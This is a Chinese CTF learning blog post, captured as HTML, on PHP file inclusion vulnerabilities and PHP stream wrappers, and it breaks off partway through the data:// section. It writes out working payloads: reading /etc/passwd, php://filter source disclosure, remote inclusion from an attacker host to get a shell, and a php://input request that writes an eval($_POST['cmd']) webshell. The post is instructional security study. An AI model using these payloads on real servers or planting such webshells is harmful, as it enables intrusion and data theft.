@@ -1,0 +1,736 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>WEB-文件包含-学习踩坑 | False</title><meta name="keywords" content="WEB"><meta name="author" content="False"><meta name="copyright" content="False"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="持续更新… 还在写，先所锁上了    持续更新… 以下函数语法、参数等信息均来自https:&#x2F;&#x2F;www.w3school.com 常见函数include() include_once() require() require_once() 功能：  通过 include 或 require 语句，可以将 PHP 文件的内容插入另一个 PHP 文件（在服务器执行它之前）。 上面四个函数不仅可以读取包含">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WEB-文件包含-学习踩坑">
+<meta property="og:url" content="http://blog.falsectf.top/2020/07/26/bf2843ff.html">
+<meta property="og:site_name" content="False">
+<meta property="og:description" content="持续更新… 还在写，先所锁上了    持续更新… 以下函数语法、参数等信息均来自https:&#x2F;&#x2F;www.w3school.com 常见函数include() include_once() require() require_once() 功能：  通过 include 或 require 语句，可以将 PHP 文件的内容插入另一个 PHP 文件（在服务器执行它之前）。 上面四个函数不仅可以读取包含">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://blog.falsectf.top/images/logo/file_include.jpg">
+<meta property="article:published_time" content="2020-07-26T05:43:35.000Z">
+<meta property="article:modified_time" content="2021-01-02T01:28:55.296Z">
+<meta property="article:author" content="False">
+<meta property="article:tag" content="WEB">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://blog.falsectf.top/images/logo/file_include.jpg"><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="http://blog.falsectf.top/2020/07/26/bf2843ff"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?c2d67b7793208bb8ca055de1d9778576";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'WEB-文件包含-学习踩坑',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-01-02 09:28:55'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    })(window)</script><meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="False" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/1.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">18</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">13</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 其他</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/images/logo/file_include.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">False</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 其他</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">WEB-文件包含-学习踩坑<a class="post-edit-link" href="null_posts/WEB-文件包含-学习踩坑.md" title="编辑" target="_blank"><i class="fas fa-pencil-alt"></i></a></h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-07-26T05:43:35.000Z" title="发表于 2020-07-26 13:43:35">2020-07-26</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-01-02T01:28:55.296Z" title="更新于 2021-01-02 09:28:55">2021-01-02</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/WEB/">WEB</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="WEB-文件包含-学习踩坑"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>持续更新…</p>
+<p>还在写，先所锁上了    持续更新…</p>
+<p>以下函数语法、参数等信息均来自<a target="_blank" rel="noopener" href="https://www.w3school.com/">https://www.w3school.com</a></p>
+<h2 id="常见函数"><a href="#常见函数" class="headerlink" title="常见函数"></a>常见函数</h2><p><strong>include()</strong></p>
+<p><strong>include_once()</strong></p>
+<p><strong>require()</strong></p>
+<p><strong>require_once()</strong></p>
+<p>功能：</p>
+<ul>
+<li>通过 include 或 require 语句，可以将 PHP 文件的内容插入另一个 PHP 文件（在服务器执行它之前）。</li>
+<li>上面四个函数不仅可以读取包含文件的内容，还能**<font color="ff0000">把读取文件的内容当作php代码执行</font>**</li>
+<li>xx_once()与include()语句完全相同，唯一区别是PHP会检查该文件是否已经被包含过，如果是则不再次包含</li>
+</ul>
+<p>include 和 require 语句是相同的，除了错误处理方面：</p>
+<ul>
+<li>require 会生成致命错误（E_COMPILE_ERROR）并<strong>停止脚本</strong></li>
+<li>include 只生成警告（E_WARNING），并且<strong>脚本会继续</strong></li>
+</ul>
+<p>语法：</p>
+<ul>
+<li>include $file;  或  include ‘filename’;</li>
+<li>include($file); 或  include(‘filename’);</li>
+</ul>
+<p><strong>file_get_content()</strong></p>
+<p><strong>注意：此函数无法自动输出，文件包含漏洞中需要配合打印函数使用</strong></p>
+<p>功能：file_get_contents() 函数把整个文件读入一个字符串中。</p>
+<p>语法：<code>file_get_contents(path,include_path,context,start,max_length)</code></p>
+<table>
+<thead>
+<tr>
+<th align="left">参数</th>
+<th align="left">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">path</td>
+<td align="left">必需。规定要读取的文件。</td>
+</tr>
+<tr>
+<td align="left">include_path</td>
+<td align="left">可选。如果也想在 include_path 中搜寻文件的话，可以将该参数设为 “1”。</td>
+</tr>
+<tr>
+<td align="left">context</td>
+<td align="left">可选。规定文件句柄的环境。context 是一套可以修改流的行为的选项。若使用 null，则忽略。</td>
+</tr>
+<tr>
+<td align="left">start</td>
+<td align="left">可选。规定在文件中开始读取的位置。该参数是 PHP 5.1 新加的。</td>
+</tr>
+<tr>
+<td align="left">max_length</td>
+<td align="left">可选。规定读取的字节数。该参数是 PHP 5.1 新加的。</td>
+</tr>
+</tbody></table>
+<p><strong>file()</strong></p>
+<p>功能：file() 函数把整个文件读入一个<strong>数组</strong>中。</p>
+<p><strong>注意：此函数无法自动输出，文件包含漏洞中需要配合打印函数使用</strong></p>
+<p>语法：<code>file(path,include_path,context)</code></p>
+<table>
+<thead>
+<tr>
+<th align="left">参数</th>
+<th align="left">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">path</td>
+<td align="left">必需。规定要读取的文件。</td>
+</tr>
+<tr>
+<td align="left">include_path</td>
+<td align="left">可选。如果也想在 include_path 中搜寻文件的话，可以将该参数设为 “1”。</td>
+</tr>
+<tr>
+<td align="left">context</td>
+<td align="left">可选。规定文件句柄的环境。context 是一套可以修改流的行为的选项。若使用 null，则忽略。</td>
+</tr>
+</tbody></table>
+<h2 id="漏洞形成"><a href="#漏洞形成" class="headerlink" title="漏洞形成"></a>漏洞形成</h2><p>比较常见的读取文件内容的函数有上诉几个(应该还有其他的，这几个比较常见)</p>
+<p>函数在使用过程中，由于使用不当导致包含的<strong>文件名可控</strong>，如下👇</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>此代码中include()函数包含的是file传入的参数，该参数可由用户任意控制，就造成了文件包含漏洞</p>
+<p>其他形式的文件包含代码案例👇</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">require</span> <span class="variable">$file</span>;  <span class="comment"># include、require函数自动输入文件内容</span></span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">echo</span> file_get_contents(<span class="variable">$file</span>); <span class="comment">#需要配合打印函数</span></span><br><span class="line"></span><br><span class="line">	var_dump(file(<span class="variable">$file</span>)); <span class="comment">#需要配合打印数组函数</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="基本利用"><a href="#基本利用" class="headerlink" title="基本利用"></a>基本利用</h3><p>读取一些敏感文件：<a target="_blank" rel="noopener" href="http://127.0.0.1/about.php?file=/etc/passwd">http://127.0.0.1/about.php?file=/etc/passwd</a></p>
+<p>在CTF中在没有过滤的情况下可直接读flag：<a target="_blank" rel="noopener" href="http://127.0.0.1/about.php?file=/flag">http://127.0.0.1/about.php?file=/flag</a></p>
+<p>或者读取一些需要的信息，知道文件的路径即可…</p>
+<h3 id="进阶利用"><a href="#进阶利用" class="headerlink" title="进阶利用"></a>进阶利用</h3><p>首先介绍两个php.ini的中关于文件包含的配置</p>
+<p>官方文档：<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/filesystem.configuration.php">https://www.php.net/manual/zh/filesystem.configuration.php</a></p>
+<p>all_url_include在php 5.2以后添加，为了安全起见默认设置如下表👇</p>
+<p>allow_url_include为Off状态下，include等函数无法进行远程文件包含（?file=<a target="_blank" rel="noopener" href="http://xxxxx)/">http://xxxxx）</a></p>
+<table>
+<thead>
+<tr>
+<th>Directive</th>
+<th>Local Value</th>
+<th>Master Value</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>allow_url_fopen</td>
+<td>On</td>
+<td>On</td>
+</tr>
+<tr>
+<td>allow_url_include</td>
+<td>Off</td>
+<td>Off</td>
+</tr>
+</tbody></table>
+<p>无论<strong>allow_url_fopen</strong>与<strong>allow_url_include</strong>是否为On或Off，都不会影响本地文件包含</p>
+<h3 id="伪协议简介"><a href="#伪协议简介" class="headerlink" title="伪协议简介"></a>伪协议简介</h3><p>经常利用的有如下几个，其他可自行百度搜索关键字{PHP伪协议}</p>
+<ul>
+<li>file://    ——访问本地文件系统，需要跟上绝对路径</li>
+<li>http://  ——访问HTTP(s)网站，网站的某个页面地址即可</li>
+<li>php://  ——访问各个输入/输出流</li>
+<li>zlib://   ——压缩流</li>
+<li>data:// ——数据流</li>
+<li>phar:// ——php归档</li>
+</ul>
+<h3 id="0x01-file"><a href="#0x01-file" class="headerlink" title="0x01 file://"></a>0x01 file://</h3><p>注意：file伪协议后必须跟上文件的<strong>绝对路径</strong></p>
+<table>
+<thead>
+<tr>
+<th>Directive</th>
+<th>Local Value</th>
+<th>Master Value</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>allow_url_fopen</td>
+<td>On/Off</td>
+<td>On/Off</td>
+</tr>
+<tr>
+<td>allow_url_include</td>
+<td>On/Off</td>
+<td>On/Off</td>
+</tr>
+</tbody></table>
+<p>在双Off的配置下也可以使用的伪协议,可以读取系统上的文件</p>
+<p>payload1：<a target="_blank" rel="noopener" href="http://127.0.0.1/1.php?file=file:///flag">http://127.0.0.1/1.php?file=file:///flag</a></p>
+<p>payload2：<a target="_blank" rel="noopener" href="http://127.0.0.1/1.php?file=file:///var/www/html/test.txt">http://127.0.0.1/1.php?file=file:///var/www/html/test.txt</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#test.txt内容</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">#1.php内容</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">#因为此时用的是include()函数，可以将读取的文件内容解析为php代码，所以页面会显示phpinfo页面</span></span><br><span class="line"><span class="comment">#如果此时用的是file()、file_get_contents()函数只会读取文件内容，无法解析其中代码</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/WEB/include/include-1.png"></p>
+<h3 id="0x02-http"><a href="#0x02-http" class="headerlink" title="0x02 http://"></a>0x02 http://</h3><p>通过文件包含的方式，将目标网站的内容包含到(展示)到此网页中</p>
+<table>
+<thead>
+<tr>
+<th>Directive</th>
+<th>Local Value</th>
+<th>Master Value</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>allow_url_fopen</td>
+<td>On/Off</td>
+<td>On/Off</td>
+</tr>
+<tr>
+<td>allow_url_include</td>
+<td>On</td>
+<td>On</td>
+</tr>
+</tbody></table>
+<p>简单利用：包含目标网站，此方法可以验证网站是否存在远程文件包含漏洞</p>
+<p><img src="/images/WEB/include/include-2.png"></p>
+<p>上诉问题如果存在，则可以利用远程文件包含进行getshell</p>
+<ol>
+<li>在自己的公网机器的web目录新建一个xxx.txt——&gt;内容为一句话木马</li>
+<li>访问<a target="_blank" rel="noopener" href="http://127.0.0.1/1.php?file=http://xxx.com/xxx.txt">http://127.0.0.1/1.php?file=http://xxx.com/xxx.txt</a></li>
+<li>使用蚁剑或菜刀等工具连接</li>
+</ol>
+<p>下方截图演示，其中test.txt的内容为：<code>&lt;?php phpinfo();?&gt;</code>，在本地解析执行，返回了phpinfo页面</p>
+<p>远程包含的文件名一定<strong>不要是.php之类的后缀</strong>，因为这样所包含的文件是目标网站解析后的结果</p>
+<p><img src="/images/WEB/include/include-3.png"></p>
+<h3 id="0x03-php-filter"><a href="#0x03-php-filter" class="headerlink" title="0x03 php://filter"></a>0x03 php://filter</h3><p>官方手册：<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.php.php">https://www.php.net/manual/zh/wrappers.php.php</a></p>
+<p><strong>描述：</strong></p>
+<blockquote>
+<p>php://filter 是一种元封装器， 设计用于数据流打开时的<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/filters.php">筛选过滤</a>应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.readfile.php">readfile()</a>、 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.file.php">file()</a> 和 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.file-get-contents.php">file_get_contents()</a>， 在数据流内容读取之前没有机会应用其他过滤器。</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th>Directive</th>
+<th>Local Value</th>
+<th>Master Value</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>allow_url_fopen</td>
+<td>On/Off</td>
+<td>On/Off</td>
+</tr>
+<tr>
+<td>allow_url_include</td>
+<td>On/Off</td>
+<td>On/Off</td>
+</tr>
+</tbody></table>
+<hr>
+<center>php://fileter参数</center>
+
+<table>
+<thead>
+<tr>
+<th align="left">名称</th>
+<th align="left">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><em>resource=&lt;要过滤的数据流&gt;</em></td>
+<td align="left">这个参数是必须的。它指定了你要筛选过滤的数据流。</td>
+</tr>
+<tr>
+<td align="left"><em>read=&lt;读链的筛选列表&gt;</em></td>
+<td align="left">该参数可选。可以设定一个或多个过滤器名称，以管道符（*|*）分隔。</td>
+</tr>
+<tr>
+<td align="left"><em>write=&lt;写链的筛选列表&gt;</em></td>
+<td align="left">该参数可选。可以设定一个或多个过滤器名称，以管道符（*|*）分隔。</td>
+</tr>
+<tr>
+<td align="left"><em>&lt;；两个链的筛选列表&gt;</em></td>
+<td align="left">任何没有以 <em>read=</em> 或 <em>write=</em> 作前缀 的筛选器列表会视情况应用于读或写链。</td>
+</tr>
+</tbody></table>
+<p>语句组成：php://filter/<strong>(read/write)</strong>=<strong>过滤器列表(多个用|分隔)</strong>/resource=<strong>文件名</strong></p>
+<hr>
+<center>常用的过滤器</center>
+
+<table>
+<thead>
+<tr>
+<th>过滤器</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>convert.base64-encode</td>
+<td>将文件内容进行BASE64编码后输出</td>
+</tr>
+<tr>
+<td>string.toupper</td>
+<td>以大写字母输出所读文件的全部内容</td>
+</tr>
+<tr>
+<td>string.rot13</td>
+<td>将文件内容进行ROT13加密后输出</td>
+</tr>
+</tbody></table>
+<p>更多关于php://filter的描述请阅读官方手册，下方列举一些常见的利用方式</p>
+<p><strong>1.读取文件内容</strong></p>
+<p>payload：<code>http://127.0.0.1/1.php?file=php://filter/resource=/etc/passwd</code></p>
+<p>此方法与直接?file=/etc/passwd几乎没有任何区别，故此作用不大</p>
+<p><strong>2.编码读取文件</strong></p>
+<p>payload1：<code>http://127.0.0.1/1.php?file=php://filter/read=convert.base64-encode/resource=2.php</code></p>
+<p>这里将读取文件内容进行<strong>base64</strong>编码后输出</p>
+<p>payload2：<code>http://127.0.0.1/1.php?file=php://filter/read=string.rot13/resource=2.php</code></p>
+<p>这里将读取文件内容进行<strong>ROT13</strong>加密后输出</p>
+<p>payload3：<code>http://127.0.0.1/1.php?file=php://filter/read=string.toupper|string.rot13/resource=2.php</code></p>
+<p>两个过滤器同时使用，<strong>用 | 分隔</strong>，输出结果为<strong>ROT13加密</strong>后的大写字母</p>
+<p><strong>3.适用函数</strong></p>
+<table>
+<thead>
+<tr>
+<th>函数名</th>
+<th>是否需要配合打印函数</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>include()</td>
+<td>否(自动输出)</td>
+</tr>
+<tr>
+<td>include_once()</td>
+<td>否(自动输出)</td>
+</tr>
+<tr>
+<td>require()</td>
+<td>否(自动输出)</td>
+</tr>
+<tr>
+<td>require_once()</td>
+<td>否(自动输出)</td>
+</tr>
+<tr>
+<td>readfile()</td>
+<td>否(自动输出)</td>
+</tr>
+<tr>
+<td>file()</td>
+<td>是(返回结果为<strong>数组</strong>)</td>
+</tr>
+<tr>
+<td>file_get_contents()</td>
+<td>是(返回结果为字符串)</td>
+</tr>
+<tr>
+<td><strong>目前只了解到上面这些</strong></td>
+<td></td>
+</tr>
+</tbody></table>
+<h3 id="0x04-php-input"><a href="#0x04-php-input" class="headerlink" title="0x04 php://input"></a>0x04 php://input</h3><p>官方手册：<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.php.php">https://www.php.net/manual/zh/wrappers.php.php</a></p>
+<p><strong>描述：</strong></p>
+<blockquote>
+<p>php://input 是个可以访问请求的原始数据的只读流。 POST 请求的情况下，最好使用 php://input 来代替 $HTTP_RAW_POST_DATA，因为它不依赖于特定的 php.ini 指令。 而且，这样的情况下 $HTTP_RAW_POST_DATA 默认没有填充， 比激活 always_populate_raw_post_data 潜在需要更少的内存。 <em>enctype=”multipart/form-data”</em> 的时候 php://input 是无效的。</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th>Directive</th>
+<th>Local Value</th>
+<th>Master Value</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>allow_url_fopen</td>
+<td>On/Off</td>
+<td>On/Off</td>
+</tr>
+<tr>
+<td>allow_url_include</td>
+<td><strong>On</strong></td>
+<td><strong>On</strong></td>
+</tr>
+</tbody></table>
+<p>要想利用php://input伪协议，allow_url_include必须为On，allow_url_fopen无所谓</p>
+<p><strong>1.利用演示</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url：http://127.0.0.1/1.php?file=php://input</span><br><span class="line">[POST data]</span><br><span class="line">	&lt;?php  phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>利用POST传输数据，内容要符合php代码语法格式，这样就可以造成任意代码执行</p>
+<p>php代码根据自己的想法去修改即可，这里只是为了验证可用性，所以使用了phpinfo();</p>
+<p><img src="/images/WEB/include/include-4.png"></p>
+<p><strong>利用php://input   写入一句话</strong></p>
+<p>会在网站根目录下生成一个false.php，内容是后面的一句话，之后可以用🐜🗡或🔪连接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url：http://127.0.0.1/1.php?file=php://input</span><br><span class="line">[POST data]</span><br><span class="line">	&lt;?php  fputs(fopen(&quot;false.php&quot;,&quot;w&quot;),&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>2.适用函数</strong></p>
+<table>
+<thead>
+<tr>
+<th>函数名</th>
+<th>是否需要配合打印函数</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>include()</td>
+<td>否(自动输出)</td>
+</tr>
+<tr>
+<td>include_once()</td>
+<td>否(自动输出)</td>
+</tr>
+<tr>
+<td>require()</td>
+<td>否(自动输出)</td>
+</tr>
+<tr>
+<td>require_once()</td>
+<td>否(自动输出)</td>
+</tr>
+</tbody></table>
+<h3 id="0x05-zip"><a href="#0x05-zip" class="headerlink" title="0x05 zip://"></a>0x05 zip://</h3><p>官方文档：<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.compression.php">https://www.php.net/manual/zh/wrappers.compression.php</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：http://127.0.0.1/1.php?file=zip://C:/phpStudy/WWW/shell.png%23shell</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x06-data"><a href="#0x06-data" class="headerlink" title="0x06 data://"></a>0x06 data://</h3><p>官方手册：<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.data.php">https://www.php.net/manual/zh/wrappers.data.php</a></p>
+<table>
+<thead>
+<tr>
+<th>Directive</th>
+<th>Local Value</th>
+<th>Master Value</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>allow_url_fopen</td>
+<td><strong>On</strong></td>
+<td><strong>On</strong></td>
+</tr>
+<tr>
+<td>allow_url_include</td>
+<td><strong>On</strong></td>
+<td><strong>On</strong></td>
+</tr>
+</tbody></table>
+<p><strong>1.利用演示</strong></p>
+<p>下面一共列举了10种payload，同一个函数可以有以下10种不同的方式来执行</p>
+<blockquote>
+<p><strong>data:text/plain,</strong></p>
+<p>payload1：<a target="_blank" rel="noopener" href="http://127.0.0.1/1.php?file=data:text/plain">http://127.0.0.1/1.php?file=data:text/plain</a>,&lt;?php phpinfo();</p>
+<p>payload2：<a target="_blank" rel="noopener" href="http://127.0.0.1/1.php?file=data:text/plain">http://127.0.0.1/1.php?file=data:text/plain</a>,&lt;?php phpinfo()?&gt;</p>
